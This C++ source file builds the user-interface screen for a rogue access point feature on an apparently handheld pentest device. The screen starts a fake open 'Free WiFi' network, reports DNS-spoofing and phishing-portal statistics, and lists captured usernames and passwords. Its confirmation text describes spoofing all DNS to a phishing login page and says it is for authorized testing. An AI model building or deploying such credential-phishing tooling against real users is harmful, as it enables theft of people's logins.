#include <cstdio>
#include <cstring>

#include "rogue_ap.h"
#include "ui.h"

static struct {
    lv_obj_t *state, *btn, *btn_lbl, *v_ssid, *v_clients, *v_dns, *v_http, *v_creds, *list;
} S;

/* Survives screen rebuilds (editing the SSID navigates to the keyboard and back). */
static char s_ssid[33] = "Free WiFi";

static void rebuild_creds(void)
{
    lv_obj_clean(S.list);
    rogue_cred_t creds[ROGUE_MAX_CREDS];
    int n = rogue_ap_creds(creds, ROGUE_MAX_CREDS);
    if (n == 0) {
        ui_label(S.list, &lv_font_montserrat_12, UI_COL_TEXT_DIM, "no credentials captured yet");
        return;
    }
    for (int i = n - 1; i >= 0; i--) {
        char line[110];
        snprintf(line, sizeof(line), "%s / %s", creds[i].user[0] ? creds[i].user : "-",
                 creds[i].pass[0] ? creds[i].pass : "-");
        lv_obj_t *l = ui_label(S.list, &lv_font_montserrat_12, UI_COL_TEXT, line);
        lv_label_set_long_mode(l, LV_LABEL_LONG_DOT);
        lv_obj_set_width(l, LV_PCT(100));
    }
}

static void update(lv_timer_t *)
{
    rogue_status_t st;
    rogue_ap_status(&st);
    bool on = st.running;
    lv_label_set_text(S.state, on ? "Running" : "Stopped");
    lv_obj_set_style_text_color(S.state, on ? UI_COL_BAD : UI_COL_TEXT_DIM, 0);
    lv_label_set_text(S.btn_lbl, on ? "Stop" : "Start");
    lv_obj_set_style_bg_color(S.btn, on ? UI_COL_BAD : UI_COL_ACCENT, 0);
    lv_label_set_text(S.v_ssid, s_ssid);
    lv_label_set_text_fmt(S.v_clients, "%d", st.clients);
    lv_label_set_text_fmt(S.v_dns, "%lu", (unsigned long)st.dns_hits);
    lv_label_set_text_fmt(S.v_http, "%lu", (unsigned long)st.http_hits);
    lv_label_set_text_fmt(S.v_creds, "%d", st.cred_count);

    static int last_creds = -1;
    if (st.cred_count != last_creds) {
        last_creds = st.cred_count;
        rebuild_creds();
    }
}

static void do_start(void)
{
    if (!rogue_ap_start(s_ssid)) ui_toast("Could not start", UI_COL_BAD);
    update(nullptr);
}

static void on_ssid_done(const char *text, void *)
{
    if (text && text[0]) strncpy(s_ssid, text, sizeof(s_ssid) - 1);
    ui_go(UI_SCR_ROGUE);
}

static void on_edit(lv_event_t *)
{
    ui_text_input("Rogue SSID", "Free WiFi", s_ssid, false, on_ssid_done, nullptr, UI_SCR_ROGUE);
}

static void on_toggle(lv_event_t *)
{
    if (rogue_ap_running()) {
        rogue_ap_stop();
        update(nullptr);
    } else {
        ui_confirm("Rogue AP",
                   "Opens a fake open network, spoofs all DNS to a phishing login page and logs "
                   "what is typed. Authorized social-engineering testing only.",
                   "Start", UI_COL_BAD, do_start);
    }
}

lv_obj_t *ui_rogue_create(void)
{
    memset(&S, 0, sizeof(S));
    if (rogue_ap_running()) {
        rogue_status_t st;
        rogue_ap_status(&st);
        snprintf(s_ssid, sizeof(s_ssid), "%s", st.ssid);
    }
    lv_obj_t *content = ui_screen_create("Rogue AP", true);

    lv_obj_t *card = ui_card(content);
    lv_obj_set_size(card, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
    S.state = ui_kv_row(card, "State");
    S.v_ssid = ui_kv_row(card, "SSID");
    S.v_clients = ui_kv_row(card, "Clients");
    S.v_dns = ui_kv_row(card, "DNS spoofed");
    S.v_http = ui_kv_row(card, "Portal loads");
    S.v_creds = ui_kv_row(card, "Captured");

    lv_obj_t *edit = ui_button_outline(content, "Edit SSID");
    lv_obj_set_size(edit, 110, 28);
    lv_obj_add_event_cb(edit, on_edit, LV_EVENT_CLICKED, nullptr);

    lv_obj_t *cap = ui_caption(content, "CAPTURED CREDENTIALS");

    S.list = ui_card(content);
    lv_obj_set_size(S.list, LV_PCT(100), 72);
    lv_obj_set_flex_flow(S.list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(S.list, 2, 0);

    S.btn = ui_button(content, "", UI_COL_ACCENT);
    S.btn_lbl = lv_obj_get_child(S.btn, 0);
    lv_obj_set_size(S.btn, 110, 30);
    lv_obj_add_event_cb(S.btn, on_toggle, LV_EVENT_CLICKED, nullptr);

    (void)cap;
    lv_timer_t *t = ui_screen_timer(content, update, 700, nullptr);
    update(t);
    return lv_obj_get_screen(content);
}
